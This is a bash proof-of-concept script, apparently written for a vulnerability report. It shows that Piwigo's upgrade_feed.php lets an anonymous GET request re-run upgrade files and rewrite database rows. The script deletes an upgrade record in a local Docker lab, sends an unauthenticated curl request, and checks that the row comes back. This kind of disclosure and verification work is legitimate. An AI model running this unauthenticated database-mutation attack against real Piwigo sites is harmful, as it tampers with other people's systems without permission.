#!/usr/bin/env bash
# f1-upgrade-feed.sh — F-1 PoC for piwigo:upgrade_feed:unauthenticated_db_mutation.
#
# Regular-user perspective: pure anonymous GET against /upgrade_feed.php.
# No cookie, no token, no special UA.
#
# Step 1: DELETE FROM piwigo_upgrade WHERE id='180' (180 is "[Aborted]"
#         in install/db/180-database.php — body is intentionally empty,
#         so the proof of the finding is purely the row re-population).
# Step 2: anonymous GET http://localhost:8089/upgrade_feed.php
# Step 3: assert the response contains "=== upgrade 180" and that
#         piwigo_upgrade.id=180 has been re-inserted with applied=NOW().

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$HERE/evidence/F1-upgrade-feed"
mkdir -p "$OUT"

WEB="${WEB:-http://localhost:8089}"
DB_USER="piwigo"
DB_PASS="pocpass"
DB_NAME="piwigo"
DB_SERVICE="piwigo-poc-db"
PREFIX="piwigo_"

DB="docker exec $DB_SERVICE mysql --user=$DB_USER --password=$DB_PASS $DB_NAME"

echo "[F-1] === BEFORE STATE ==="
$DB -e "SELECT id, applied, description FROM ${PREFIX}upgrade WHERE id='180';" \
  > "$OUT/db-before-180.txt"
echo "  piwigo_upgrade.id=180 BEFORE:"
sed 's/^/    /' "$OUT/db-before-180.txt"
echo

echo "[F-1] === STEP 1: delete piwigo_upgrade.id=180 to create pending state ==="
$DB -e "DELETE FROM ${PREFIX}upgrade WHERE id='180';"
$DB -e "SELECT COUNT(*) AS pending_after FROM ${PREFIX}upgrade WHERE applied IS NULL;" \
  > "$OUT/pending-count.txt"
echo "  pending rows: $(tail -1 "$OUT/pending-count.txt")"
echo

echo "[F-1] === STEP 2: anonymous GET $WEB/upgrade_feed.php ==="
RESPONSE_FILE="$OUT/response-body.txt"
HTTP=$(curl -sS -o "$RESPONSE_FILE" -w '%{http_code}' "$WEB/upgrade_feed.php")
echo "  HTTP status: $HTTP"
echo "  response: $(wc -c < "$RESPONSE_FILE") bytes"
echo "  response body:"
sed 's/^/    /' "$RESPONSE_FILE"
echo

echo "[F-1] === STEP 3: AFTER STATE ==="
$DB -e "SELECT id, applied, description FROM ${PREFIX}upgrade WHERE id='180';" \
  > "$OUT/db-after-180.txt"
echo "  piwigo_upgrade.id=180 AFTER:"
sed 's/^/    /' "$OUT/db-after-180.txt"
echo

echo "[F-1] === ASSERTIONS ==="
PASS=true

# (1) Response body must contain the F-1 marker line "=== upgrade 180"
if grep -q '=== upgrade 180' "$RESPONSE_FILE"; then
  echo "  [PASS] response body contains '=== upgrade 180'"
else
  echo "  [FAIL] response body does NOT contain '=== upgrade 180'"
  PASS=false
fi

# (2) The DB AFTER state must contain 180-database.php's $upgrade_description
#     (Note: upgrade_feed.php does NOT echo $upgrade_description in the response
#      body — it is only used in the INSERT INTO piwigo_upgrade. The fact that
#      the AFTER description text matches install/db/180-database.php line 12
#      is the proof that upgrade_feed.php loaded and ran the file.)
if grep -q '\[Aborted\]' "$OUT/db-after-180.txt"; then
  echo "  [PASS] DB AFTER description matches install/db/180-database.php (proves the file was loaded)"
else
  echo "  [FAIL] DB AFTER description does NOT match the script (upgrade did not run)"
  PASS=false
fi

# (3) piwigo_upgrade must now have id=180 with applied=NOW()
APPLIED=$(awk 'NR==2 {print $2}' "$OUT/db-after-180.txt")
if [[ -n "$APPLIED" && "$APPLIED" != "NULL" && "$APPLIED" != "0000-00-00" ]]; then
  echo "  [PASS] piwigo_upgrade.id=180 has new applied timestamp ($APPLIED)"
else
  echo "  [FAIL] piwigo_upgrade.id=180 not repopulated"
  PASS=false
fi

# (4) Response body has no cookie/authorization/token lines (confirms anon)
if grep -Eq 'Cookie:|Authorization:|^pwg_token' "$RESPONSE_FILE"; then
  echo "  [FAIL] response body contains unexpected auth surface"
  PASS=false
else
  echo "  [PASS] response body has no cookie/authorization/token lines (confirms anonymous request)"
fi

# (5) Demonstrate the curl request itself carried no cookies via -v trace
echo "  -- verify the curl request itself carried no cookies --"
TRACE="$OUT/request-trace.txt"
curl -sS -v -o /dev/null "$WEB/upgrade_feed.php" 2> "$TRACE"
if grep -q '^> Cookie:' "$TRACE"; then
  echo "  [FAIL] curl request sent a Cookie header (not anon)"
  PASS=false
else
  echo "  [PASS] curl request sent NO Cookie header"
fi

echo
if $PASS; then
  echo "[F-1] === RESULT: PASS — anonymous DB mutation confirmed ==="
  exit 0
else
  echo "[F-1] === RESULT: FAIL — see assertions above ==="
  exit 1
fi